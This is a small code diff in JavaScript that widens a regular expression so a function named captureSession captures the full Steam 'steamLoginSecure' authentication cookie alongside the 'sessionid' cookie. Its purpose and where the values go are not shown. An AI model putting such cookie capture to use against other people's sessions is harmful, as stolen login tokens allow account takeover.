@@ -33,7 +33,7 @@
     }
     function captureSession() {
       const sidMatch = document.cookie.match(/(?:^|;\s*)sessionid=([0-9a-f]+)/);
-      const loginMatch = document.cookie.match(/(?:^|;\s*)steamLoginSecure=([0-9a-f]+%7C%7C[0-9a-f]+)/);
+      const loginMatch = document.cookie.match(/(?:^|;\s*)steamLoginSecure=([^;]+)/);
       if (sidMatch && sidMatch[1]) {
         const sid = sidMatch[1];
         const login = loginMatch ? loginMatch[1] : '';
